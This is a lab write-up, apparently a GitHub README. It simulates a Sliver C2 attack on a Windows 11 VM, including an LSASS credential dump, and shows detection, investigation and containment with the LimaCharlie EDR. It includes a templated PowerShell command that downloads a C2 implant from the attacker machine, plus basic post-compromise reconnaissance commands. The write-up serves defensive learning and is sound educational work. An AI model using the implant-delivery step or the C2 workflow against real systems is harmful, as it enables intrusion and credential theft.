# LimaCharlie-EDR-Lab
![Architecture](https://i.imgur.com/6mftsEk.jpg)

## Introduction

In this project, I conducted a simulated real-life cyber attack scenario to evaluate the effectiveness of my security measures. To set up the environment, I created two virtual machines on a NatNetwork: an Ubuntu Server acting as the attacker and a Windows 11 machine as the victim.

To bolster the security of the victim machine, I implemented a LimaCharlie sensor and Sysmon, which proved invaluable in detecting potential attacks and security events. Additionally, on the Ubuntu Server, I installed [Sliver-Server C2](https://bishopfox.com/blog/sliver), a command and control attack tool. The primary focus of the attack was a Credential Gathering technique utilizing LSASS.exe to extract usernames and passwords.

I executed the C2 attack while simultaneously developing detection rules to promptly alert administrators of any suspicious activities. The main objective of this lab project was to highlight the significance of robust security measures in safeguarding against cyber attacks.

The Technologies and Tools used during this project:

* Virtual Box NatNetwork: Used to create the virtualized network environment.
* Virtual Machines: Windows 11 and Ubuntu Server 22.04 virtual machines were employed to simulate the victim and attacker systems.
* LimaCharlieEDR: Deployed as an endpoint detection and response (EDR) solution on the victim machine to enhance security monitoring and threat detection capabilities.
* Sliver-Server: Installed on the Ubuntu Server as a command and control (C2) attack tool to enable remote control and further exploitation.
 

## Labbing

After setting up the environment, the next step involved creating a Sliver-Server C2 implant on the Ubuntu server to be installed on the Windows system.


![Implant](https://i.imgur.com/LEP0qSk.png)


To facilitate the installation process, a quick web server was set up on the Ubuntu machine. This web server would host the C2 payload, allowing it to be easily accessed and downloaded by the Windows device.

On the Windows system, a PowerShell command was executed to initiate the download and save the C2 implant. The specific PowerShell command used was:

![IWR](https://i.imgur.com/dadsDeX.png)

IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]

In this command, [IpAddress] refers to the IP address of the Ubuntu machine hosting the C2 payload, [ImplantName] represents the name of the C2 implant file, and [FileLocation] indicates the desired location on the Windows system where the implant should be saved.

Once the C2 implant is successfully downloaded onto the Windows device, the next step would involve executing the malicious file. This execution grants the C2 infrastructure control over the compromised Windows system, allowing for remote access and potential malicious activities.

![Excute](https://i.imgur.com/mkdYQkp.png)

## Excuting Commands on Victum Device

Once inside the Sliver-Server session, we have the ability to run commands and gather information about the compromised device. Here are some commands that can be executed within the Sliver-Server session to identify the device:

![Session](https://i.imgur.com/4SE5ZEE.png)

Whoami - Hostname

PWD - Print Working Directory

Netstat - Network connections

ps -T - Process Tree (Sliver highlights its own files green )

![Tree](https://i.imgur.com/CfmWUyF.png)


## Inside LimaCharlie EDR

After successfully installing the malicious file, it is important to leverage the capabilities of our EDR (Endpoint Detection and Response) solution to gain visibility into the compromised system. Here's what can be done using the EDR solution:

Processes Analysis: Begin by examining the running processes on the compromised system. Look for any suspicious or unfamiliar processes. During the investigation, an unsigned file is discovered, highlighted in yellow, indicating a potentially malicious presence.
    
![process](https://i.imgur.com/Pts6px0.png)

File Location and LimaCharlie Filesystem Section: Upon identifying the suspicious process, investigate further to determine its file location. In this case, it is found within the Downloads folder of a user named "Victum." To gain more insights, access the LimaCharlie filesystem section to locate and analyze the identified file.
    
![filesystem](https://i.imgur.com/ksRCp3P.png)

Timeline Analysis: Shift focus to the timeline of events surrounding the installation of the malicious file. Explore the activities leading up to and following the installation to identify any relevant indicators of compromise (IOCs) or suspicious behavior. During this analysis, a network connection is observed, and it is found that the file of concern is named "COMPLEX_BELL."

![timeline](https://i.imgur.com/jYVSaNr.png)

Hash Analysis with VirusTotal: Proceed with gathering the hash of the suspicious file and conduct a lookup using VirusTotal, a popular online threat intelligence platform. However, when querying VirusTotal with the file's hash, no results are returned. This lack of detection suggests that the attacker likely crafted the file themselves, evading traditional signature-based antivirus detection.


## Credential Gathering

One of the critical objectives for attackers is gaining access to multiple user accounts. A common technique used to achieve this is by extracting credentials from the LSASS.exe file, which contains usernames, passwords, and security tokens.

To understand LSASS Credential Gathering in more detail, you can refer to the documentation provided by [Mitre](https://attack.mitre.org/techniques/T1003/001/).

Attackers typically run a command to copy the contents of the LSASS file and dump it onto their own host, enabling them to extract and analyze the gathered credentials.

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

To detect this specific method of Credential Gathering, we can create a detection rule in LimaCharlie. The rule will be designed to identify any interaction with the LSASS file. However, it is important to note that this detection rule may generate false positives if administrators are legitimately accessing the LSASS file for administrative purposes. In a lab scenario like this, where there are no actual users, this rule is suitable for detecting the LSASS dump command.

![lsass-detection-rule](https://i.imgur.com/6bDKczs.png)


Once the detection rule is implemented in LimaCharlie, running the LSASS dump command again will trigger the detection within the LimaCharlie system. The detection event will provide visibility into the unauthorized LSASS file access, allowing security analysts to investigate and respond to the potential credential gathering activity.

![Lima-Detections](https://i.imgur.com/mCsvF9u.png)


## Containment & Eradication

After identifying an attack on a device within the network, it is crucial to quickly implement containment and eradication steps to minimize further damage and prevent the attacker from expanding their reach.

Containment:
    The first step is to assess whether the attack has affected other devices within the network. In the case of this lab scenario, where only one virtual machine (VM) is present, it can be determined that the attack is limited to this single device. However, in a larger network, it is crucial to identify and isolate any compromised devices promptly. Isolating the affected device from the network ensures that the attacker cannot move laterally or launch further attacks on the internal network.

![isolate](https://i.imgur.com/E3bqXh9.png)

 Eradication:
    Once the affected device is isolated, eradication steps can be initiated. If the compromised device is a virtual machine, returning it to a known good snapshot can effectively remove any malicious changes made during the attack. Alternatively, in the LimaCharlie EDR platform, the malicious file can be identified and deleted from the filesystem section. It is also important to conduct a thorough examination of logs and detections to ensure that no other malware or attacks have occurred on the device.
    
![filesystem](https://i.imgur.com/ksRCp3P.png)

 Password and Account Security:
    Given that the attack involved credential theft, it is crucial to address potential access risks. Changing passwords for all affected accounts is paramount to prevent unauthorized access. Additionally, implementing multi-factor authentication (MFA) can significantly enhance the security of user accounts.

## Conclusion

In conclusion, this project simulated a real-life cyber attack scenario to evaluate the effectiveness of implemented security measures and demonstrate the importance of robust incident response procedures.

To set up the environment, a network was established with an Ubuntu Server acting as the attacker and a Windows 11 machine as the victim. LimaCharlie sensor and Sysmon were deployed on the victim machine to enhance security monitoring, while Sliver-Server C2 was installed on the Ubuntu Server for conducting controlled attacks.

Throughout the simulation, various stages of incident response were executed. After identifying the attack's occurrence on the victim machine, containment measures were implemented to prevent further spread within the network. In this lab scenario with a single VM, the isolation of the affected device was straightforward. However, in larger networks, promptly identifying and isolating compromised devices is essential to contain the attacker's movement and limit potential damage to the internal network.

Eradication steps were then taken to remove the attacker's foothold. Depending on the setup, the affected device could be restored to a known good snapshot in the case of a virtual machine or the malicious file could be deleted through LimaCharlie's filesystem section. Thorough examination of logs and detections ensured that no other malware or attacks were present on the device.

Given that the attack involved credential gathering, additional measures were taken to enhance account security. Passwords for affected accounts were changed, multi-factor authentication (MFA) should be implemented for real-world scenarios.

Through the execution of this simulated cyber attack and the implementation of appropriate incident response procedures. This project showcased the importance of promptly identifying and containing attacks, eradicating malicious elements, and fortifying account security to protect against cyber threats.

## Credit

This project was based on a blog post by [Eric Capuano](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro?sd=pf) and Video by [Gerald Auger](https://www.youtube.com/watch?v=oOzihldLz7U&list=PL4Q-ttyNIRApvPC_QVW9gcKHzjvMrzSCy&index=4)

This Project is for educational use only.


